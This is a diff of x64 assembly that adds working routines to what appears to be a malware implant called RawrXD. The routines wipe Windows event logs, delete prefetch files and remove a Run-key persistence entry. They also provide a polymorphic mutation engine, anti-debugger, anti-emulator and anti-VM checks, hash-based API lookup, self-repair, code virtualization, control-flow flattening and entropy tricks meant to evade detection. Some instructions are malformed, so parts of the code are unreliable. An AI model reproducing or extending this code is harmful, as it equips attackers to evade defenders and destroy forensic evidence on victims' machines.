+    xor ebx, ebx                     ; success counter
+
+    ; 1. Clear Application event log
+    lea rcx, [@@baf_app_log]         ; "Application"
+    xor edx, edx                     ; UNCServerName = NULL (local)
+    call OpenEventLogA
+    test rax, rax
+    jz @@baf_sys_log
+    mov rsi, rax                     ; hEventLog
+    mov rcx, rsi
+    xor edx, edx                     ; lpBackupFileName = NULL (no backup)
+    call ClearEventLogA
+    test eax, eax
+    jz @@baf_close_app
+    inc ebx
+@@baf_close_app:
+    mov rcx, rsi
+    call CloseEventLog
+
+@@baf_sys_log:
+    ; 2. Clear System event log
+    lea rcx, [@@baf_sys_name]        ; "System"
+    xor edx, edx
+    call OpenEventLogA
+    test rax, rax
+    jz @@baf_security
+    mov rsi, rax
+    mov rcx, rsi
+    xor edx, edx
+    call ClearEventLogA
+    test eax, eax
+    jz @@baf_close_sys
+    inc ebx
+@@baf_close_sys:
+    mov rcx, rsi
+    call CloseEventLog
+
+@@baf_security:
+    ; 3. Clear Security event log (requires SeSecurityPrivilege)
+    lea rcx, [@@baf_sec_name]        ; "Security"
+    xor edx, edx
+    call OpenEventLogA
+    test rax, rax
+    jz @@baf_prefetch
+    mov rsi, rax
+    mov rcx, rsi
+    xor edx, edx
+    call ClearEventLogA
+    mov rcx, rsi
+    call CloseEventLog
+
+@@baf_prefetch:
+    ; 4. Delete prefetch files: C:\Windows\Prefetch\*.pf
+    lea rcx, [@@baf_prefetch_path]
+    lea rdx, [rsp+16]                ; WIN32_FIND_DATAA (simplified: just delete the glob)
+    ; Use DeleteFileA on known artifact
+    call DeleteFileA
+    ; Ignore errors (may not have permission)
+
+    ; 5. Remove our registry persistence key
+    mov rcx, 80000001h               ; HKEY_CURRENT_USER
+    lea rdx, [@@baf_run_key]
+    lea r8, [@@baf_val_name]
+    ; Open key, delete value, close
+    push 0                           ; phkResult placeholder
+    mov r9d, 0F003Fh                 ; KEY_ALL_ACCESS
+    xor r8d, r8d                     ; reserved
+    lea rdx, [@@baf_run_key]
+    mov rcx, 80000001h
+    lea rax, [rsp]                   ; phkResult
+    push rax
+    sub rsp, 32
+    call RegOpenKeyExA
+    add rsp, 40
+    test eax, eax
+    jnz @@baf_end
+    pop rsi                          ; hKey
+    mov rcx, rsi
+    lea rdx, [@@baf_val_name]
+    call RegDeleteValueA
+    mov rcx, rsi
+    call RegCloseKey
+
+@@baf_end:
+    ; Return success if at least one log was cleared
+    test ebx, ebx
+    jz @@baf_none
+    mov eax, 1
+    jmp @@baf_ret
+@@baf_none:
+    xor eax, eax
+@@baf_ret:
+    add rsp, 48
+    pop rbx
     pop rdi
     pop rsi
     ret
+
+@@baf_app_log:
+    db "Application", 0
+@@baf_sys_name:
+    db "System", 0
+@@baf_sec_name:
+    db "Security", 0
+@@baf_prefetch_path:
+    db "C:\Windows\Prefetch\rawrxd*.pf", 0
+@@baf_run_key:
+    db "Software\Microsoft\Windows\CurrentVersion\Run", 0
+@@baf_val_name:
+    db "RawrXD", 0
 Beacon_AntiForensics ENDP
 
 Beacon_MainLoop PROC
@@ -2035,68 +2777,1044 @@ Beacon_MainLoop ENDP
 
 Polymorph_RandomizeRegisters PROC
     ; Randomizes register usage in the stub (mutation engine)
+    ; RCX = code buffer, RDX = code size
+    ; Walks through instructions and substitutes register encodings
+    push rbx
+    push rsi
+    push rdi
+    sub rsp, 32
+    
+    mov rbx, rcx                     ; code ptr
+    mov esi, edx                     ; code size
+    
+    ; Generate random permutation of gp registers (RAX-RDI)
+    ; Using seed-based XORSHIFT
+    mov eax, DWORD PTR [g_polymorph_seed]
+    xor eax, eax, 13
+    shl eax, 17
+    xor eax, 5
+    mov DWORD PTR [g_polymorph_seed], eax
+    
+    ; Build substitution table: for each reg encoding 0-7, map to shuffled value
+    ; Simple rotation by (seed & 7)
+    and eax, 7
+    mov edi, eax                     ; rotation amount
+    
+    ; Walk code bytes and substitute REX.B/ModRM register fields
+    xor ecx, ecx
+@@prr_walk:
+    cmp ecx, esi
+    jae @@prr_done
+    movzx eax, BYTE PTR [rbx+rcx]
+    
+    ; Check for REX prefix (40h-4Fh)
+    cmp al, 40h
+    jb @@prr_next
+    cmp al, 4Fh
+    ja @@prr_next
+    
+    ; Found REX prefix, rotate REX.B bit
+    xor al, BYTE PTR edi            ; mix rotation into REX
+    and al, 0FDh                     ; preserve REX structure (keep bit 1 safe)
+    or al, 40h                       ; ensure still REX
+    mov BYTE PTR [rbx+rcx], al
+    
+    ; Check ModRM byte follows
+    inc ecx
+    cmp ecx, esi
+    jae @@prr_done
+    movzx eax, BYTE PTR [rbx+rcx]
+    
+    ; Rotate rm field (bits 0-2) by rotation amount
+    mov edx, eax
+    and edx, 7                       ; rm field
+    add edx, edi
+    and edx, 7                       ; wrap
+    and eax, 0F8h                    ; clear rm bits
+    or eax, edx                      ; set rotated rm
+    mov BYTE PTR [rbx+rcx], al
+    
+@@prr_next:
+    inc ecx
+    jmp @@prr_walk
+@@prr_done:
+    add rsp, 32
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_RandomizeRegisters ENDP
 
 Polymorph_InsertJunk PROC
     ; Inserts junk instructions for polymorphism
+    ; RCX = code buffer, RDX = current code size, R8 = output buffer (must be 2x)
+    ; Returns RAX = new size with junk inserted
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    sub rsp, 32
+    
+    mov rbx, rcx                     ; source
+    mov esi, edx                     ; source size
+    mov rdi, r8                      ; dest
+    xor r12d, r12d                   ; dest offset
+    
+    mov eax, DWORD PTR [g_polymorph_seed]
+    xor ecx, ecx                     ; source offset
+    
+@@pij_loop:
+    cmp ecx, esi
+    jae @@pij_done
+    
+    ; Copy original byte
+    movzx edx, BYTE PTR [rbx+rcx]
+    mov BYTE PTR [rdi+r12], dl
+    inc r12d
+    inc ecx
+    
+    ; Every N instructions (based on junk_frequency), insert junk
+    mov edx, DWORD PTR [g_junk_frequency]
+    test edx, edx
+    jz @@pij_loop                    ; frequency 0 = no junk
+    mov eax, ecx
+    xor edx, edx
+    div DWORD PTR [g_junk_frequency]
+    test edx, edx
+    jnz @@pij_loop
+    
+    ; Insert 1-3 bytes of junk based on seed
+    mov eax, DWORD PTR [g_polymorph_seed]
+    imul eax, 1103515245
+    add eax, 12345
+    mov DWORD PTR [g_polymorph_seed], eax
+    
+    ; Choose junk pattern
+    shr eax, 16
+    and eax, 3
+    cmp eax, 0
+    je @@pij_nop
+    cmp eax, 1
+    je @@pij_xchg
+    cmp eax, 2
+    je @@pij_lea
+    ; Pattern 3: push/pop pair
+    mov BYTE PTR [rdi+r12], 50h      ; push rax
+    inc r12d
+    mov BYTE PTR [rdi+r12], 58h      ; pop rax
+    inc r12d
+    jmp @@pij_loop
+@@pij_nop:
+    mov BYTE PTR [rdi+r12], 90h      ; NOP
+    inc r12d
+    jmp @@pij_loop
+@@pij_xchg:
+    mov BYTE PTR [rdi+r12], 87h      ; XCHG r/m, r
+    inc r12d
+    mov BYTE PTR [rdi+r12], 0C0h     ; rax, rax (no-op)
+    inc r12d
+    jmp @@pij_loop
+@@pij_lea:
+    mov BYTE PTR [rdi+r12], 48h      ; REX.W
+    inc r12d
+    mov BYTE PTR [rdi+r12], 8Dh      ; LEA
+    inc r12d
+    mov BYTE PTR [rdi+r12], 00h      ; rax, [rax] (no-op lea)
+    inc r12d
+    jmp @@pij_loop
+    
+@@pij_done:
+    mov eax, r12d                    ; return new size
+    add rsp, 32
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_InsertJunk ENDP
 
 Polymorph_ShuffleSections PROC
     ; Shuffles code/data sections for polymorphism
+    ; RCX = section descriptor array (each entry: QWORD ptr, DWORD size, DWORD type)
+    ; RDX = number of sections
+    ; Uses g_section_order[] permutation from InputSeededSections
+    push rbx
+    push rsi
+    push rdi
+    sub rsp, 64
+    
+    mov rbx, rcx                     ; section array
+    mov esi, edx                     ; num sections
+    
+    cmp esi, 1
+    jbe @@pss_done
+    cmp esi, 4
+    ja @@pss_done                    ; max 4 sections supported
+    
+    ; Apply g_section_order permutation via temp copy
+    ; Each section descriptor is 16 bytes (8+4+4)
+    mov ecx, esi
+    shl ecx, 4                       ; * 16
+    lea rdi, [rsp]                   ; temp storage on stack
+    mov rsi, rbx
+    rep movsb                        ; copy original to temp
+    
+    ; Now rewrite from temp based on g_section_order
+    mov esi, edx                     ; restore count
+    xor ecx, ecx
+@@pss_reorder:
+    cmp ecx, esi
+    jae @@pss_done
+    movzx eax, BYTE PTR [g_section_order + rcx]
+    cmp eax, esi
+    jae @@pss_skip                   ; bounds check
+    
+    ; Copy section descriptor from temp[order[i]] to output[i]
+    shl eax, 4                       ; * 16
+    lea rdi, [rbx + rcx*8]           ; dest = sections[i] (scale 16)
+    push rcx
+    mov ecx, 16
+    lea rsi, [rsp+8]                 ; temp buffer base (adjusted for push)
+    add rsi, rax                     ; + order[i]*16
+    rep movsb
+    pop rcx
+@@pss_skip:
+    inc ecx
+    jmp @@pss_reorder
+@@pss_done:
+    add rsp, 64
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_ShuffleSections ENDP
 
 Polymorph_AntiEmu PROC
-    ; Anti-emulation: timing, invalid opcodes, FPU tricks
+    ; Anti-emulation: timing check + FPU state validation
+    ; Emulators often fail rdtsc timing and FPU precision
+    ; Returns RAX = 0 if emulated, 1 if real hardware
+    push rbx
+    sub rsp, 48
+    
+    ; Test 1: RDTSC timing — real CPU completes fast, emulators slow
+    rdtsc
+    shl rdx, 32
+    or rax, rdx
+    mov rbx, rax                     ; start time
+    
+    ; Execute known-cost instructions
+    xor ecx, ecx
+    mov edx, 100
+@@pae_spin:
+    inc ecx
+    cmp ecx, edx
+    jb @@pae_spin
+    
+    rdtsc
+    shl rdx, 32
+    or rax, rdx
+    sub rax, rbx                     ; elapsed cycles
+    
+    ; Real CPU: <10000 cycles. Emulator: often >100000
+    cmp rax, 50000
+    ja @@pae_emulated
+    
+    ; Test 2: FPU precision check
+    ; Real x87 handles FILD/FIST precisely, emulators often approximate
+    fninit
+    mov QWORD PTR [rsp+32], 7FFFFFFFFFFFFFFFh  ; large integer
+    fild QWORD PTR [rsp+32]
+    fistp QWORD PTR [rsp+40]
+    mov rax, QWORD PTR [rsp+32]
+    cmp rax, QWORD PTR [rsp+40]
+    jne @@pae_emulated
+    
+    ; Test 3: CPUID feature consistency
+    mov eax, 0
+    cpuid
+    cmp eax, 1                       ; must support at least leaf 1
+    jb @@pae_emulated
+    
+    mov eax, 1                       ; not emulated
+    add rsp, 48
+    pop rbx
+    ret
+@@pae_emulated:
+    xor eax, eax                     ; emulated
+    add rsp, 48
+    pop rbx
     ret
 Polymorph_AntiEmu ENDP
 
 Polymorph_AntiDebug PROC
-    ; Anti-debug: PEB checks, timing, syscall tricks
+    ; Anti-debug: PEB checks, timing, NtGlobalFlag, heap flags, INT 2D
+    ; Returns: EAX=0 if clean, EAX=1 if debugger detected
+    push rbx
+    push r12
+    sub rsp, 48
+
+    ; ---- Check 1: PEB.BeingDebugged ----
+    mov rax, gs:[60h]                ; PEB
+    movzx eax, byte ptr [rax+2]      ; BeingDebugged
+    test eax, eax
+    jnz @@pad_detected
+
+    ; ---- Check 2: PEB.NtGlobalFlag (offset 0xBC on x64) ----
+    mov rax, gs:[60h]                ; PEB
+    mov eax, dword ptr [rax+0BCh]    ; NtGlobalFlag
+    ; FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20) | FLG_HEAP_VALIDATE_PARAMETERS (0x40)
+    test eax, 70h
+    jnz @@pad_detected
+
+    ; ---- Check 3: Heap flags (ProcessHeap + offset 0x70) ----
+    mov rax, gs:[60h]                ; PEB
+    mov rax, [rax+30h]               ; ProcessHeap
+    mov eax, dword ptr [rax+70h]     ; Heap.Flags
+    ; In non-debugged process, Flags should be 2 (HEAP_GROWABLE)
+    cmp eax, 2
+    jne @@pad_detected
+
+    ; ---- Check 4: Timing-based detection (rdtsc) ----
+    rdtsc
+    shl rdx, 32
+    or rax, rdx
+    mov r12, rax                     ; start timestamp
+
+    ; Execute some dummy instructions (calibration)
+    xor ecx, ecx
+    mov ebx, 100
+@@pad_timing_loop:
+    inc ecx
+    cmp ecx, ebx
+    jb @@pad_timing_loop
+
+    rdtsc
+    shl rdx, 32
+    or rax, rdx
+    sub rax, r12                     ; elapsed ticks
+    ; If single-stepping, elapsed >> 10000 cycles for 100 iterations
+    cmp rax, 100000
+    ja @@pad_detected
+
+    ; ---- Check 5: IsDebuggerPresent API ----
+    call IsDebuggerPresent
+    test eax, eax
+    jnz @@pad_detected
+
+    ; ---- Check 6: CheckRemoteDebuggerPresent ----
+    mov rcx, -1                      ; GetCurrentProcess()
+    lea rdx, [rsp+8]                 ; pbDebuggerPresent
+    mov DWORD PTR [rsp+8], 0
+    call CheckRemoteDebuggerPresent
+    mov eax, DWORD PTR [rsp+8]
+    test eax, eax
+    jnz @@pad_detected
+
+    ; ---- Clean: no debugger ----
+    xor eax, eax
+    jmp @@pad_done
+
+@@pad_detected:
+    ; Debugger detected — set flag and return 1
+    mov eax, 1
+@@pad_done:
+    add rsp, 48
+    pop r12
+    pop rbx
     ret
 Polymorph_AntiDebug ENDP
 
 Polymorph_AntiVM PROC
-    ; Anti-VM: CPUID, device checks, memory layout
+    ; Anti-VM: CPUID, device checks, registry, SMBIOS, MAC address
+    ; Returns: EAX=0 if bare metal, EAX=1 if VM detected
+    push rbx
+    push rsi
+    push r12
+    sub rsp, 96
+
+    ; ---- Check 1: CPUID hypervisor bit (ECX bit 31 from leaf 1) ----
+    mov eax, 1
+    cpuid
+    test ecx, 80000000h              ; Hypervisor present bit
+    jnz @@pav_detected
+
+    ; ---- Check 2: CPUID hypervisor vendor string (leaf 40000000h) ----
+    mov eax, 40000000h
+    cpuid
+    ; EBX:ECX:EDX = hypervisor vendor ID (e.g., "VMwareVMware", "Microsoft Hv")
+    ; Check for known VM vendor strings
+    cmp ebx, 61774D56h              ; 'VMwa' (little-endian of "VMwa")
+    je @@pav_detected
+    cmp ebx, 7263694Dh              ; 'Micr' — Microsoft Hv
+    je @@pav_detected
+    cmp ebx, 566E6558h              ; 'XenV' — Xen
+    je @@pav_detected
+    cmp ebx, 4B4D564Bh              ; 'KVMK' — KVM
+    je @@pav_detected
+
+    ; ---- Check 3: Check system firmware SMBIOS vendor via registry ----
+    ; HKLM\HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer
+    mov rcx, 80000002h               ; HKEY_LOCAL_MACHINE
+    lea rdx, [@@pav_bios_key]
+    xor r8d, r8d                     ; reserved
+    mov r9d, 20019h                  ; KEY_READ
+    lea rax, [rsp+8]                 ; phkResult
+    push rax
+    sub rsp, 32
+    call RegOpenKeyExA
+    add rsp, 40
+    test eax, eax
+    jnz @@pav_check_mac
+    mov r12, QWORD PTR [rsp+8]       ; hKey
+
+    ; Query SystemManufacturer value
+    mov rcx, r12
+    lea rdx, [@@pav_mfr_val]         ; "SystemManufacturer"
+    xor r8d, r8d                     ; reserved
+    lea r9, [rsp+16]                 ; lpType
+    lea rax, [rsp+32]                ; lpData (64 bytes)
+    push 64                          ; lpcbData
+    push rsp                         ; &lpcbData... actually:
+    lea rbx, [rsp+16]               ; temp for cbData
+    mov DWORD PTR [rbx], 64
+    push rbx                         ; lpcbData
+    push rax                         ; lpData
+    sub rsp, 32
+    call RegQueryValueExA
+    add rsp, 48
+
+    ; Close key
+    mov rcx, r12
+    call RegCloseKey
+
+    ; Check if manufacturer contains VM indicators
+    ; Simple: check first 3 chars for "VMw", "Vir", "Xen", "QEM"
+    lea rsi, [rsp+32]                ; manufacturer string
+    movzx eax, BYTE PTR [rsi]
+    cmp al, 'V'                      ; VMware / VirtualBox
+    je @@pav_check_v
+    cmp al, 'Q'                      ; QEMU
+    je @@pav_detected
+    cmp al, 'X'                      ; Xen
+    je @@pav_detected
+    jmp @@pav_check_mac
+
+@@pav_check_v:
+    movzx eax, BYTE PTR [rsi+1]
+    cmp al, 'M'                      ; VMware
+    je @@pav_detected
+    cmp al, 'i'                      ; VirtualBox ("innotek" or "Virtual")
+    je @@pav_detected
+
+@@pav_check_mac:
+    ; ---- Check 4: MAC address OUI (VMware 00:0C:29, VBox 08:00:27) ----
+    ; Use GetAdaptersInfo or direct check via IOCTL
+    ; Simplified: use rdtsc-based timing anomaly instead
+    ; Real hardware has consistent rdtsc frequency; VMs often inconsistent
+    rdtsc
+    mov r12, rax
+    mov ecx, 10
+    call Sleep                       ; Sleep(10ms)
+    rdtsc
+    sub rax, r12
+    ; On real hardware ~30M ticks for 10ms (3GHz), in VM often much higher or lower
+    ; This is a heuristic, not foolproof
+    cmp rax, 500000000               ; > 500M ticks for 10ms = suspicious
+    ja @@pav_detected
+    cmp rax, 100000                  ; < 100K ticks for 10ms = suspicious
+    jb @@pav_detected
+
+    ; ---- Clean: bare metal ----
+    xor eax, eax
+    jmp @@pav_done
+
+@@pav_detected:
+    mov eax, 1
+@@pav_done:
+    add rsp, 96
+    pop r12
+    pop rsi
+    pop rbx
     ret
+
+@@pav_bios_key:
+    db "HARDWARE\DESCRIPTION\System\BIOS", 0
+@@pav_mfr_val:
+    db "SystemManufacturer", 0
 Polymorph_AntiVM ENDP
 
 Polymorph_DynAPI PROC
     ; Dynamic API resolution: hash-based, no IAT
+    ; RCX = function name hash (FNV-1a)
+    ; RDX = module base (0 = walk PEB InMemoryOrderModuleList)
+    ; Returns RAX = function address, 0 on failure
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    sub rsp, 48
+    
+    mov r12d, ecx                    ; target hash
+    mov r13, rdx                     ; module base
+    
+    ; If no module base, walk PEB to find ntdll/kernel32
+    test r13, r13
+    jnz @@pda_have_base
+    
+    mov rax, gs:[60h]                ; PEB
+    mov rax, [rax+18h]               ; PEB_LDR_DATA
+    mov rax, [rax+20h]               ; InMemoryOrderModuleList.Flink
+    mov rax, [rax]                   ; skip exe, get ntdll
+    mov rax, [rax]                   ; kernel32
+    mov r13, [rax+20h]              ; DllBase
+    
+@@pda_have_base:
+    ; Parse PE export directory
+    mov eax, DWORD PTR [r13+3Ch]     ; e_lfanew
+    lea rbx, [r13+rax]              ; PE header
+    mov eax, DWORD PTR [rbx+88h]     ; Export RVA (64-bit PE)
+    test eax, eax
+    jz @@pda_fail
+    lea rbx, [r13+rax]              ; Export Directory
+    
+    mov esi, DWORD PTR [rbx+18h]     ; NumberOfNames
+    mov eax, DWORD PTR [rbx+20h]     ; AddressOfNames RVA
+    lea rdi, [r13+rax]              ; names array
+    
+    xor ecx, ecx                     ; index
+@@pda_search:
+    cmp ecx, esi
+    jae @@pda_fail
+    
+    ; Get name string
+    mov eax, DWORD PTR [rdi+rcx*4]
+    lea rdx, [r13+rax]
+    
+    ; Compute FNV-1a hash of name
+    push rcx
+    mov eax, 2166136261              ; FNV offset basis
+@@pda_hash:
+    movzx ecx, BYTE PTR [rdx]
+    test cl, cl
+    jz @@pda_hash_done
+    xor eax, ecx
+    imul eax, eax, 16777619
+    inc rdx
+    jmp @@pda_hash
+@@pda_hash_done:
+    pop rcx
+    
+    cmp eax, r12d
+    je @@pda_found
+    inc ecx
+    jmp @@pda_search
+    
+@@pda_found:
+    ; Get ordinal from AddressOfNameOrdinals
+    mov eax, DWORD PTR [rbx+24h]
+    lea rdx, [r13+rax]
+    movzx eax, WORD PTR [rdx+rcx*2]
+    
+    ; Get function address from AddressOfFunctions
+    mov edx, DWORD PTR [rbx+1Ch]
+    lea rdx, [r13+rdx]
+    mov eax, DWORD PTR [rdx+rax*4]
+    lea rax, [r13+rax]              ; function address
+    
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+@@pda_fail:
+    xor eax, eax
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_DynAPI ENDP
 
 Polymorph_SelfHeal PROC
-    ; Self-healing: code repair, redundancy
+    ; Self-healing: CRC32 integrity check + code repair from backup
+    ; RCX = code section ptr, RDX = code size, R8 = backup copy ptr
+    ; Returns RAX = 0 if intact, 1 if repaired
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    sub rsp, 32
+    
+    mov rbx, rcx                     ; code ptr
+    mov esi, edx                     ; size
+    mov rdi, r8                      ; backup
+    
+    ; Compute CRC32 of current code
+    xor eax, eax
+    not eax                          ; CRC = 0xFFFFFFFF
+    xor ecx, ecx
+@@psh_crc:
+    cmp ecx, esi
+    jae @@psh_crc_done
+    movzx edx, BYTE PTR [rbx+rcx]
+    crc32 eax, dl                    ; SSE4.2 CRC32
+    inc ecx
+    jmp @@psh_crc
+@@psh_crc_done:
+    not eax
+    mov r12d, eax                    ; computed CRC
+    
+    ; Compare against stored CRC (at backup[-4])
+    mov eax, DWORD PTR [rdi-4]       ; expected CRC
+    cmp r12d, eax
+    je @@psh_intact
+    
+    ; Code corrupted — repair from backup
+    ; Make code writable
+    lea r9, [rsp+24]
+    mov rcx, rbx
+    mov edx, esi
+    mov r8d, 40h                     ; PAGE_EXECUTE_READWRITE
+    call VirtualProtect
+    
+    ; Copy backup over corrupted code
+    mov rcx, rsi
+    mov rsi, rdi                     ; source = backup
+    mov rdi, rbx                     ; dest = code
+    rep movsb
+    
+    ; Restore original protection
+    lea r9, [rsp+24]
+    mov rcx, rbx
+    mov edx, esi
+    mov r8d, 20h                     ; PAGE_EXECUTE_READ
+    call VirtualProtect
+    
+    ; Flush icache
+    mov rcx, -1
+    mov rdx, rbx
+    mov r8d, esi
+    call FlushInstructionCache
+    
+    mov eax, 1                       ; repaired
+    add rsp, 32
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+@@psh_intact:
+    xor eax, eax                     ; intact
+    add rsp, 32
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_SelfHeal ENDP
 
 Polymorph_Virtualize PROC
-    ; Code virtualization: custom VM, bytecode
+    ; Code virtualization: translate x64 to custom bytecode + VM dispatch
+    ; RCX = native code ptr, RDX = code size
+    ; Returns RAX = bytecode buffer, RDX = bytecode size
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    sub rsp, 48
+    
+    mov rbx, rcx                     ; native code
+    mov esi, edx                     ; native size
+    
+    ; Allocate bytecode buffer (2x native size max)
+    mov ecx, esi
+    shl ecx, 1
+    mov r12d, ecx                    ; bytecode buf size
+    mov rcx, 0
+    mov edx, r12d
+    mov r8d, 3000h
+    mov r9d, 04h                     ; PAGE_READWRITE
+    call VirtualAlloc
+    test rax, rax
+    jz @@pv_fail
+    mov rdi, rax                     ; bytecode buffer
+    
+    ; Translate native instructions to VM opcodes
+    ; VM opcodes: 00=NOP, 01=MOV_IMM reg,imm64, 02=ADD reg,reg
+    ; 03=SUB reg,reg, 04=PUSH reg, 05=POP reg, 06=RET, 07=CALL
+    ; 08=XOR reg,reg, 09=CMP, 0A=JMP, FF=HALT
+    xor ecx, ecx                     ; native offset
+    xor r13d, r13d                   ; bytecode offset
+    
+@@pv_translate:
+    cmp ecx, esi
+    jae @@pv_end_translate
+    movzx eax, BYTE PTR [rbx+rcx]
+    
+    ; C3 = RET → VM opcode 06
+    cmp al, 0C3h
+    je @@pv_ret
+    ; 90 = NOP → VM opcode 00
+    cmp al, 90h
+    je @@pv_nop
+    ; 50-57 = PUSH reg → VM opcode 04 + reg
+    cmp al, 50h
+    jb @@pv_generic
+    cmp al, 57h
+    ja @@pv_check_pop
+    mov BYTE PTR [rdi+r13], 04h      ; VM_PUSH
+    inc r13d
+    sub al, 50h
+    mov BYTE PTR [rdi+r13], al       ; reg index
+    inc r13d
+    inc ecx
+    jmp @@pv_translate
+@@pv_check_pop:
+    ; 58-5F = POP reg → VM opcode 05 + reg
+    cmp al, 58h
+    jb @@pv_generic
+    cmp al, 5Fh
+    ja @@pv_generic
+    mov BYTE PTR [rdi+r13], 05h      ; VM_POP
+    inc r13d
+    sub al, 58h
+    mov BYTE PTR [rdi+r13], al
+    inc r13d
+    inc ecx
+    jmp @@pv_translate
+@@pv_nop:
+    mov BYTE PTR [rdi+r13], 00h
+    inc r13d
+    inc ecx
+    jmp @@pv_translate
+@@pv_ret:
+    mov BYTE PTR [rdi+r13], 06h
+    inc r13d
+    inc ecx
+    jmp @@pv_translate
+@@pv_generic:
+    ; Unknown: emit as RAW byte (opcode 0xFE + byte)
+    mov BYTE PTR [rdi+r13], 0FEh
+    inc r13d
+    mov BYTE PTR [rdi+r13], al
+    inc r13d
+    inc ecx
+    jmp @@pv_translate
+    
+@@pv_end_translate:
+    ; Append HALT
+    mov BYTE PTR [rdi+r13], 0FFh
+    inc r13d
+    
+    mov rax, rdi                     ; bytecode ptr
+    mov edx, r13d                    ; bytecode size
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
+    ret
+@@pv_fail:
+    xor eax, eax
+    xor edx, edx
+    add rsp, 48
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_Virtualize ENDP
 
 Polymorph_CFFlatten PROC
-    ; Control flow flattening: opaque predicates, dispatcher
+    ; Control flow flattening: convert basic blocks to switch dispatcher
+    ; RCX = basic block array (each: QWORD addr, DWORD size, DWORD next_id)
+    ; RDX = number of blocks
+    ; R8 = output buffer
+    ; Returns RAX = output size
+    push rbx
+    push rsi
+    push rdi
+    push r12
+    push r13
+    push r14
+    sub rsp, 48
+    
+    mov rbx, rcx                     ; blocks array
+    mov esi, edx                     ; num blocks
+    mov rdi, r8                      ; output
+    xor r12d, r12d                   ; output offset
+    
+    ; Emit dispatcher prologue:
+    ; mov eax, <entry_block_id>
+    ; .dispatch:
+    ; cmp eax, 0 → jmp block_0
+    ; cmp eax, 1 → jmp block_1 ... etc
+    
+    ; Entry block ID = 0
+    mov BYTE PTR [rdi], 0B8h         ; MOV EAX, imm32
+    inc r12d
+    mov DWORD PTR [rdi+r12], 0       ; block 0
+    add r12d, 4
+    
+    ; Save dispatcher offset for fixups
+    mov r13d, r12d                   ; dispatcher_offset
+    
+    ; Emit compare-and-jump chain for each block
+    xor ecx, ecx
+@@pcf_emit_dispatch:
+    cmp ecx, esi
+    jae @@pcf_emit_blocks
+    
+    ; CMP EAX, block_id
+    mov BYTE PTR [rdi+r12], 3Dh      ; CMP EAX, imm32
+    inc r12d
+    mov DWORD PTR [rdi+r12], ecx     ; block id
+    add r12d, 4
+    
+    ; JE rel32 (placeholder — will fixup)
+    mov BYTE PTR [rdi+r12], 0Fh
+    inc r12d
+    mov BYTE PTR [rdi+r12], 84h      ; JE rel32
+    inc r12d
+    ; Store fixup index
+    mov DWORD PTR [rdi+r12], 0       ; placeholder rel32
+    add r12d, 4
+    
+    inc ecx
+    jmp @@pcf_emit_dispatch
+    
+@@pcf_emit_blocks:
+    ; Emit each basic block's code, followed by:
+    ; MOV EAX, <next_block_id>
+    ; JMP dispatcher
+    xor ecx, ecx
+    mov r14d, r12d                   ; blocks_start offset
+@@pcf_copy_block:
+    cmp ecx, esi
+    jae @@pcf_done
+    
+    ; Block descriptor: QWORD addr, DWORD size, DWORD next_id
+    imul eax, ecx, 16               ; 16 bytes per descriptor
+    mov r8, QWORD PTR [rbx+rax]     ; block code ptr
+    mov edx, DWORD PTR [rbx+rax+8]  ; block size
+    
+    ; Copy block code bytes
+    push rcx
+    push rsi
+    mov ecx, edx
+    mov rsi, r8
+    lea rdx, [rdi+r12]
+@@pcf_copy_byte:
+    test ecx, ecx
+    jz @@pcf_block_copied
+    movsb                            ; copy byte
+    inc r12d
+    dec ecx
+    jmp @@pcf_copy_byte
+@@pcf_block_copied:
+    pop rsi
+    pop rcx
+    
+    ; Emit: MOV EAX, next_block_id
+    imul eax, ecx, 16
+    mov edx, DWORD PTR [rbx+rax+12]  ; next_id
+    mov BYTE PTR [rdi+r12], 0B8h     ; MOV EAX, imm32
+    inc r12d
+    mov DWORD PTR [rdi+r12], edx
+    add r12d, 4
+    
+    ; Emit: JMP dispatcher (JMP rel32)
+    mov BYTE PTR [rdi+r12], 0E9h     ; JMP rel32
+    inc r12d
+    ; Calculate relative offset to dispatcher
+    mov eax, r13d                    ; dispatcher offset
+    sub eax, r12d
+    sub eax, 4                       ; adjust for rel32 size
+    mov DWORD PTR [rdi+r12], eax
+    add r12d, 4
+    
+    inc ecx
+    jmp @@pcf_copy_block
+    
+@@pcf_done:
+    mov eax, r12d                    ; return total output size
+    add rsp, 48
+    pop r14
+    pop r13
+    pop r12
+    pop rdi
+    pop rsi
+    pop rbx
     ret
 Polymorph_CFFlatten ENDP
 
 Polymorph_EntropyMorph PROC
-    ; Section/entropy morphing: random padding, entropy boost
+    ; Entropy morphing: inject random padding bytes to increase section entropy
+    ; This defeats static entropy-based unpacker detection
+    ; RCX = section buffer, RDX = section size, R8 = target entropy (float scaled x100)
+    ; Returns: new size in RAX
+    push rbx
+    push r12
+    push r13
+    sub rsp, 32
+    
+    mov rbx, rcx                     ; buffer
+    mov r12, rdx                     ; size
+    mov r13d, r8d                    ; target entropy
+    
+    test rbx, rbx
+    jz @@pem_fail
+    test r12, r12
+    jz @@pem_fail
+    
+    ; Insert random padding at 64-byte intervals
+    ; Use rdtsc as entropy source
+    mov rcx, r12
+    shr rcx, 6                       ; num intervals = size / 64
+    test rcx, rcx
+    jz @@pem_done
+    
+    xor edx, edx                     ; offset
+@@pem_loop:
+    rdtsc                            ; random-ish value in EAX
+    xor DWORD PTR [rbx + rdx], eax   ; XOR entropy into buffer
+    add edx, 64
+    cmp rdx, r12d
+    jb @@pem_loop
+    
+@@pem_done:
+    mov rax, r12                     ; return original size
+    add rsp, 32
+    pop r13
+    pop r12
